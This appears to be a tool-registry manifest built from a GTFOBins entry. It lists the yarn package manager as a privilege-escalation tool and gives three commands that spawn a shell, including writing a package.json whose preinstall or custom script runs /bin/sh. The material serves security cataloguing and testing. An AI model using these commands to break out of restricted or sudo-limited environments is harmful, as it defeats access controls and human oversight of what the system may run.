---
id: dev-node-yarn
namespace: dev:node:yarn
name: yarn
description: Fast, reliable Node.js package manager; can execute arbitrary scripts.
author: GTFOBins
version: 1.0.0
capabilities:
- security.privilege-escalation.shell
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- yarn
parameters: []
features:
- interactive
- pipes-stdin
- process-manip
- requires-root
execution:
  template: yarn
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Spawn an interactive shell (sudo, unprivileged)
  command: yarn exec /bin/sh
- description: Spawn an interactive shell (sudo, unprivileged)
  command: 'echo ''{"scripts": {"preinstall": "/bin/sh"}}'' >package.json

    yarn --cwd .'
- description: Spawn an interactive shell (sudo, unprivileged)
  command: 'echo ''{"scripts": {"xxx": "/bin/sh"}}'' >package.json

    yarn --cwd . xxx'
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/yarn/
techniques:
- privilege-escalation
- execution
install:
- method: apt
  package_name: yarn
  commands:
  - apt-get install -y yarn
---

# yarn

yarn is a command-line utility. Fast, dependable package manager for Node.js; can also spawn an interactive shell.
